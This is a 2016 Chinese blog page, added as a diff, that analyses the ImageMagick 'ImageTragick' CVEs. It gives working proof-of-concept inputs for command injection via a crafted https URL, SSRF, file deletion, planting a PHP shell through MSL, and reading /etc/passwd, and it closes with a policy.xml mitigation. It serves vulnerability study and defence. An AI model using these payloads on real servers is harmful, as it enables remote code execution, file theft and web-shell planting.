@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ImageMagic初步分析 | Manning23</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="ImageMagick介绍ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。ImageMagick是免费软件：全部源码开放，可以自由使用，复制，修改，发布，它遵守GPL许可协议，可以运行于大多数的操作系统，ImageMagick的大多数功能的使">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ImageMagic初步分析">
+<meta property="og:url" content="http://yoursite.com/2016/05/05/ImageMagic初步分析/index.html">
+<meta property="og:site_name" content="Manning23">
+<meta property="og:description" content="ImageMagick介绍ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。ImageMagick是免费软件：全部源码开放，可以自由使用，复制，修改，发布，它遵守GPL许可协议，可以运行于大多数的操作系统，ImageMagick的大多数功能的使">
+<meta property="og:image" content="http://yoursite.com/2016/05/05/ImageMagic初步分析/m1.png">
+<meta property="og:image" content="http://yoursite.com/2016/05/05/ImageMagic初步分析/m2.png">
+<meta property="og:image" content="http://yoursite.com/2016/05/05/ImageMagic初步分析/m3.png">
+<meta property="og:image" content="http://yoursite.com/2016/05/05/ImageMagic初步分析/m4.png">
+<meta property="og:image" content="http://yoursite.com/2016/05/05/ImageMagic初步分析/m5.png">
+<meta property="og:image" content="http://yoursite.com/2016/05/05/ImageMagic初步分析/m6.png">
+<meta property="og:updated_time" content="2017-05-25T07:33:20.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ImageMagic初步分析">
+<meta name="twitter:description" content="ImageMagick介绍ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。ImageMagick是免费软件：全部源码开放，可以自由使用，复制，修改，发布，它遵守GPL许可协议，可以运行于大多数的操作系统，ImageMagick的大多数功能的使">
+<meta name="twitter:image" content="http://yoursite.com/2016/05/05/ImageMagic初步分析/m1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Manning23" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Manning23</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-ImageMagic初步分析" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/05/05/ImageMagic初步分析/" class="article-date">
+  <time datetime="2016-05-05T07:30:03.000Z" itemprop="datePublished">2016-05-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ImageMagic初步分析
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="ImageMagick介绍"><a href="#ImageMagick介绍" class="headerlink" title="ImageMagick介绍"></a>ImageMagick介绍</h4><p>ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。ImageMagick是免费软件：全部源码开放，可以自由使用，复制，修改，发布，它遵守GPL许可协议，可以运行于大多数的操作系统，ImageMagick的大多数功能的使用都来源于命令行工具。</p>
+<p>ImageMagick的代码地址 <a href="https://github.com/ImageMagick/ImageMagick" target="_blank" rel="external">https://github.com/ImageMagick/ImageMagick</a></p>
+<h4 id="ImageMagick漏洞介绍"><a href="#ImageMagick漏洞介绍" class="headerlink" title="ImageMagick漏洞介绍"></a>ImageMagick漏洞介绍</h4><p>此次ImageMagick 共爆出了5个CVE。</p>
+<ul>
+<li>CVE-2016-3714 - Insufficient shell characters filtering leads to code execution</li>
+<li>CVE-2016-3718 - SSRF</li>
+<li>CVE-2016-3715 - File deletion</li>
+<li>CVE-2016-3716 - File moving</li>
+<li>CVE-2016-3717 - Local file read</li>
+</ul>
+<p>目前来看，大家热议的漏洞是 CVE-2016-3714，此漏洞利用最为直接，属于有条件的RCE。</p>
+<h4 id="CVE-2016-3714分析"><a href="#CVE-2016-3714分析" class="headerlink" title="CVE-2016-3714分析"></a>CVE-2016-3714分析</h4><p>在代码 ImageMagick/MagickCore/delegate.c 中有 system(sanitize_command) 操作，但是sanitize_command可被用户直接控制，并且对输入的内容没有进行过滤，因此造成命令执行。</p>
+<p>sanitize_command从command中取值，command的内容为</p>
+<p><img src="/2016/05/05/ImageMagic初步分析/m1.png" alt=""></p>
+<p>第99行的代码为：</p>
+<delegate decode="\"https\"" command="\""wget"" -q="" -o="" "%o"="" "https:%m"\"="">
+
+<p>而command命令为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;wget&quot; -q -O &quot;%o&quot; &quot;https:%M&quot;</div></pre></td></tr></table></figure>
+<p>而%M是从我们输入的内容获取的，因此我们只要构造一个https开头的链接，再拼上命令即可完成RCE（需要考虑双引号的闭合）。</p>
+<p>POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">convert &apos;https://test&quot;|whoami&quot;&apos; 1.png</div></pre></td></tr></table></figure>
+<p><img src="/2016/05/05/ImageMagic初步分析/m2.png" alt=""></p>
+<p>对于mvg图片的转化，我们生成一个mvg文件，如下所示</p>
+<p><img src="/2016/05/05/ImageMagic初步分析/m3.png" alt=""></p>
+<p>执行convert后，如期产生echo内容。</p>
+<p><img src="/2016/05/05/ImageMagic初步分析/m4.png" alt=""></p>
+<p>对于svg图片的转化，我们生成一个svg文件，如下所示</p>
+<p><img src="/2016/05/05/ImageMagic初步分析/m5.png" alt=""></p>
+<p>执行convert后，如期产生echo内容。</p>
+<p><img src="/2016/05/05/ImageMagic初步分析/m6.png" alt=""></p>
+<h4 id="CVE-2016-3718分析"><a href="#CVE-2016-3718分析" class="headerlink" title="CVE-2016-3718分析"></a>CVE-2016-3718分析</h4><p>此漏洞属于SSRF，可以利用mvg语法的url函数，向服务器发起http请求，根据响应时间，判断服务器地址是否存在。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ssrf.mvg</div><div class="line">-=-=-=-=-=-=-=-=-</div><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill &apos;url(http://example.com/)&apos;</div><div class="line">pop graphic-context</div><div class="line"> </div><div class="line">$ convert ssrf.mvg out.png</div></pre></td></tr></table></figure>
+<h4 id="CVE-2016-3715分析"><a href="#CVE-2016-3715分析" class="headerlink" title="CVE-2016-3715分析"></a>CVE-2016-3715分析</h4><p>此漏洞属于任意文件删除，可以利用mvg语法的ephemeral协议，删除当前权限下的服务器的任意文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">delete_file.mvg</div><div class="line">-=-=-=-=-=-=-=-=-</div><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image over 0,0 0,0 &apos;ephemeral:/tmp/delete.txt&apos;</div><div class="line">popgraphic-context</div><div class="line"> </div><div class="line">$ touch /tmp/delete.txt</div><div class="line">$ convert delete_file.mvg out.png # deletes /tmp/delete.txt</div></pre></td></tr></table></figure>
+<h4 id="CVE-2016-3716分析"><a href="#CVE-2016-3716分析" class="headerlink" title="CVE-2016-3716分析"></a>CVE-2016-3716分析</h4><p>此漏洞属于任意文件更改，可以利用mvg语法的msl协议，使用效果类似于linux下的move命令。</p>
+<p>在特定条件下，如对文件后缀进行了过滤，但是可以上传文件，并且知道文件的绝对路径，此时再使用ImageMagick库就会产生问题。有些情况下，可以产生服务器被拿下的风险。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">file_move.mvg</div><div class="line">-=-=-=-=-=-=-=-=-</div><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image over 0,0 0,0 &apos;msl:/tmp/msl.txt&apos;</div><div class="line">popgraphic-context</div><div class="line"> </div><div class="line">/tmp/msl.txt</div><div class="line">-=-=-=-=-=-=-=-=-</div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;image&gt;</div><div class="line">&lt;read filename=&quot;/tmp/image.gif&quot; /&gt;</div><div class="line">&lt;write filename=&quot;/var/www/shell.php&quot; /&gt;</div><div class="line">&lt;/image&gt;</div><div class="line"> </div><div class="line">/tmp/image.gif - image with php shell inside</div><div class="line">(https://www.secgeek.net/POC/POC.gif for example)</div><div class="line"> </div><div class="line">$ convert file_move.mvg out.png</div></pre></td></tr></table></figure>
+<h4 id="CVE-2016-3717分析"><a href="#CVE-2016-3717分析" class="headerlink" title="CVE-2016-3717分析"></a>CVE-2016-3717分析</h4><p>此漏洞属于任意文件读取，可以利用mvg语法的label协议，读取当前权限下的服务器的任意文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">file_read.mvg</div><div class="line">-=-=-=-=-=-=-=-=-</div><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image over 0,0 0,0 &apos;label:@/etc/passwd&apos;</div><div class="line">pop graphic-context</div><div class="line"> </div><div class="line">$ convert file_read.mvg out.png</div></pre></td></tr></table></figure>
+<h4 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h4><p>此漏洞和java反序列化漏洞造成影响的方式相似，均为需要结合具体的应用才能造成危害。</p>
+<p>目前从乌云报告的漏洞来看，Wordpress的图片功能，新浪的SAE沙盒绕过，Baidu上传图片接口，人人网等已被爆出漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://www.wooyun.org/bugs/wooyun-2016-0205051</div><div class="line">http://www.wooyun.org/bugs/wooyun-2016-0205206</div><div class="line">http://www.wooyun.org/bugs/wooyun-2016-0205047</div><div class="line">http://www.wooyun.org/bugs/wooyun-2016-0205256</div></pre></td></tr></table></figure>
+<p>由于此漏洞的利用方式比较特殊，因此不具备批量扫描的能力。</p>
+<h4 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h4><p>1，鉴定图片文件的文件头是否符合预期。</p>
+<p>2，修改ImageMagick的配置文件（Mac的路径为 /usr/local/Cellar/imagemagick/6.9.3-0/etc/ImageMagick-6/policy.xml），如下所示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;policymap&gt;</div><div class="line">    &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPHEMERAL&quot; /&gt;</div><div class="line">    &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;URL&quot; /&gt;</div><div class="line">    &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;HTTPS&quot; /&gt;</div><div class="line">    &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MVG&quot; /&gt;</div><div class="line">    &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MSL&quot; /&gt;</div><div class="line">&lt;/policymap&gt;</div></pre></td></tr></table></figure>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="http://pastebin.com/aE4sKnCg" target="_blank" rel="external">http://pastebin.com/aE4sKnCg</a></p>
+<p><a href="http://weibo.com/p/1001603971443670055277" target="_blank" rel="external">http://weibo.com/p/1001603971443670055277</a></p>
+</delegate>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/05/05/ImageMagic初步分析/" data-id="cj343myeb00010ofyz4izood8" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/03/08/Struts2-Jakarta模块Content-type命令执行漏洞-CVE-2017-5638/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Struts2 Jakarta模块Content-type命令执行漏洞(CVE-2017-5638)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2015/12/22/Java反序列化内容/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Java反序列化内容</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/05/05/WordPress-4-6版本远程代码执行漏洞/">WordPress 4.6版本远程代码执行漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/21/Struts2-S046命令执行漏洞/">Struts2 S046命令执行漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/08/Struts2-Jakarta模块Content-type命令执行漏洞-CVE-2017-5638/">Struts2 Jakarta模块Content-type命令执行漏洞(CVE-2017-5638)</a>
+          </li>
+        
+          <li>
+            <a href="/2016/05/05/ImageMagic初步分析/">ImageMagic初步分析</a>
+          </li>
+        
+          <li>
+            <a href="/2015/12/22/Java反序列化内容/">Java反序列化内容</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Manning23<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
